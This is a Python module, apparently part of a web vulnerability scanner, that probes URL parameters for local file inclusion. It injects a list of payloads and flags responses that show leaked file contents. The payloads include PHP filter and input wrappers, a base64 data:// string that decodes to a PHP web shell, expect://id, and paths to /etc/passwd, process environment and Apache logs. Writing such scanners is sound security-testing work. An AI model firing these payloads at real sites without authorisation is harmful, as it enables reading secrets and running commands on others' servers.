"""Advanced LFI: wrappers, filters, log poisoning."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

LFI_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    "expect://id",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "php://filter/read=string.rot13/resource=index.php",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        for payload in LFI_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status == 0:
                continue
            text = r.text or ""
            if any(m in text for m in ["root:x:", "PD9wa", "uid=", "environ", "rot13"]):
                findings.append(Finding(
                    id="lfi-adv-{}-{}".format(param, hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="Advanced LFI (wrapper/filter)",
                    severity="high",
                    url=new_url,
                    parameter=param,
                    payload=payload,
                    evidence="File content or wrapper output",
                    response_snippet=r.snippet(300),
                    confidence=0.7,
                ))
                break
    log_event(parsed.netloc, "lfi_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
